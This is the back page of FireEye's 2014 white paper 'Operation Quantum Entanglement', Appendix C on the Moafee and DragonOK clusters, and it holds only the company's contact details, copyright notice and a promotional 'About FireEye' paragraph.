V2.123  www.fireeye.com\nFireEye:  Operation Quantum Entanglement Appendix C: Moafee and DragonOK Clusters\nFireEye:  Operation Quantum Entanglement \nFireEye, Inc.  |  1440 McCarthy Blvd. Milpitas, CA 95035  |  408.321.6300  |  877.FIREEYE (347.3393)  |  info@fireeye.com  |  www.fireeye.com\n© 2014  FireEye, Inc. All rights reserved. FireEye is a registered trademark of FireEye, \nInc. All other brands, products, or service names are or may be trademarks or service \nmarks of their respective owners.  WP .OQE.EN-US.072014About FireEye, Inc.  \nFireEye has invented a purpose-built, virtual \nmachine-based security platform that provides \nreal-time threat protection to enterprises and \ngovernments worldwide against the next generation of cyber attacks. These highly \nsophisticated cyber attacks easily circumvent \ntraditional signature-based defenses, such as next-generation firewalls, IPS, anti-virus, and \ngateways. The FireEye Threat Prevention Platform  \n provides real-time, dynamic threat protection \nwithout the use of signatures to protect an organization across the primary threat vectors and \nacross the different stages of an attack life cycle. \nThe core of the FireEye platform is a virtual execution engine, complemented by dynamic threat \nintelligence, to identify and block cyber attacks in \nreal time. FireEye has over 1,900 customers across more than 60 countries, including over 130 of the \nFortune 500."
}